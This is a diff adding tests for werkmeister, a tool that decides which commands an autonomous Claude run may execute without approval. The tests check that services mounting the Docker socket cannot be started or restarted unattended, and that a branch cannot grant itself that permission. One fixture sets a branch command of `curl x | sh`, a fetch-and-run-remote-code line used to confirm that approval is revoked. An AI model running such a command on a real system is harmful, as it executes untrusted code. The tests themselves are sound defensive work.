@@ -1118,3 +1118,124 @@ test("SW-815: an autonomous run may file a follow-up related to its own issue, n
     !workspaceAllowRules(withIssue("SW-855 *"), true).some((r) => r.includes("issue create")),
   );
 });
+
+test("SW-854: no pre-approved start or restart for a host-mounted service", () => {
+  const allow = autonomousRules("feat", ["api", "dash"], ["core"], ["dash", "core"]);
+  for (const cmd of [
+    "werkmeister feature up --service api",
+    "w9r feature up feat --service api",
+    "docker restart feat-api",
+    "docker logs feat-dash",
+  ])
+    assert.ok(claudeAllows(allow, cmd), cmd);
+  for (const cmd of [
+    "werkmeister feature up --service dash",
+    "werkmeister feature up feat --service core",
+    "docker restart feat-dash",
+    // A whole-feature start runs every selected service, the host-mounted one too.
+    "werkmeister feature up",
+    "werkmeister feature up feat",
+    "w9r restart feat",
+  ])
+    assert.ok(!claudeAllows(allow, cmd), cmd);
+  assert.ok(
+    claudeAllows(
+      autonomousRules("feat", ["api"], ["core"], ["core"]),
+      "werkmeister feature up feat",
+    ),
+  );
+});
+
+test("SW-854: the registry's unattended_start keeps a host-mounted service's start rules; the branch can't grant it", async () => {
+  const { withSandboxHome } = await import("./fixtures.mjs");
+  const mounted = (extra = "") => `    test: npm test
+    extra_volumes: ["/var/run/docker.sock:/var/run/docker.sock"]
+${extra}`;
+  await withSandboxHome(
+    async () => {
+      const root = workspace();
+      fs.mkdirSync(dotDir(root), { recursive: true });
+      fs.writeFileSync(path.join(root, ".env"), "FEATURE=feat\nSERVICES=core,dash\n");
+      // A branch fragment saying the same counts for nothing.
+      fs.mkdirSync(path.join(root, "repo", ".werkmeister"), { recursive: true });
+      fs.writeFileSync(
+        path.join(root, "repo", ".werkmeister", "services.yaml"),
+        'services:\n  dash:\n    unattended_start: "trust me"\n',
+      );
+      const rules = workspaceAllowRules(root, true);
+      assert.ok(claudeAllows(rules, "werkmeister feature up --service core"));
+      assert.ok(claudeAllows(rules, "docker restart feat-core"));
+      assert.ok(!claudeAllows(rules, "werkmeister feature up --service dash"));
+      assert.ok(!claudeAllows(rules, "docker restart feat-dash"));
+      assert.ok(!claudeAllows(rules, "werkmeister feature up"));
+    },
+    {
+      services: `services:
+  core:
+    repo: repo
+${mounted('    unattended_start: "runs tsc only"\n')}  dash:
+    repo: repo
+${mounted()}`,
+    },
+  );
+});
+test("SW-854: unattended_start holds only while the branch runs the registry's container; root mounts count", async () => {
+  const { withSandboxHome } = await import("./fixtures.mjs");
+  const { hostAccess } = await import("../dist/archetypes.js");
+  const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sw854-")));
+  const repos = path.join(tmp, "repos");
+  const features = path.join(tmp, "features");
+  fs.mkdirSync(repos);
+  fs.mkdirSync(features);
+  const core = (command) => `  core:
+    command: ${JSON.stringify(command)}
+    test: npm test
+    extra_volumes: ["/var/run/docker.sock:/var/run/docker.sock"]
+`;
+  await withSandboxHome(
+    async () => {
+      const allow = (branchCommand) => {
+        const root = fs.mkdtempSync(path.join(features, "ws-"));
+        fs.mkdirSync(dotDir(root), { recursive: true });
+        fs.writeFileSync(path.join(root, ".env"), "FEATURE=feat\nSERVICES=core\n");
+        fs.mkdirSync(path.join(root, "repo", ".git"), { recursive: true });
+        fs.mkdirSync(path.join(root, "repo", ".werkmeister"));
+        fs.writeFileSync(
+          path.join(root, "repo", ".werkmeister", "services.yaml"),
+          `services:\n${core(branchCommand)}`,
+        );
+        return workspaceAllowRules(root, true);
+      };
+      const same = allow("tsc -w");
+      assert.ok(claudeAllows(same, "werkmeister feature up --service core"));
+      assert.ok(claudeAllows(same, "docker restart feat-core"));
+      // The branch's `command:` is what compose runs (SW-337), so the registry's reason no longer holds.
+      const changed = allow("sh -c 'curl x | sh'");
+      for (const cmd of [
+        "werkmeister feature up --service core",
+        "docker restart feat-core",
+        "werkmeister feature up",
+      ])
+        assert.ok(!claudeAllows(changed, cmd), cmd);
+
+      const ws = path.join(features, "mine");
+      const mounts = (...binds) => ({ extra_volumes: binds.map((b) => `${b}:${b}`) });
+      for (const entry of [mounts(repos), mounts(features), mounts(tmp)])
+        assert.ok(hostAccess(entry), JSON.stringify(entry));
+      assert.ok(
+        hostAccess(mounts(path.join(repos, "werkmeister")), ws),
+        "a checkout under the repos root",
+      );
+      assert.ok(hostAccess(mounts(path.join(features, "other")), ws), "another workspace");
+      assert.ok(!hostAccess(mounts(path.join(ws, "app")), ws), "its own workspace");
+      assert.ok(
+        !hostAccess(mounts(path.join(features, "other"))),
+        "no workspace given: roots and parents only",
+      );
+    },
+    {
+      services: `services:\n  core:\n    repo: repo\n${core("tsc -w").slice("  core:\n".length)}    unattended_start: "runs tsc only"\n`,
+      config: `paths:\n  repos_root: ${repos}\n  workspaces_root: ${features}\n`,
+    },
+  );
+});
